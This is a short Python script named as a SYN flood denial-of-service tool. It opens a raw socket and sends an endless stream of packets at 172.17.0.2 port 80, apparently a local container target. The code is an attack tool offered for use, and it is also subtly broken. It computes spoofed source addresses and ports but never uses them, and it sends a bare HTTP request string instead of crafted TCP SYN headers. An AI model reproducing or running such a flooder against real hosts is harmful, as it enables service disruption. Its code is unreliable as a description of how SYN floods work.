import socket
import random


def syn_flood(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while True:
        source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        source_port = random.randint(1024, 65535)

        packet = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        s.sendto(packet.encode(), (target_ip, target_port))


if __name__ == "__main__":
    target_ip = "172.17.0.2"
    target_port = 80

    syn_flood(target_ip, target_port)
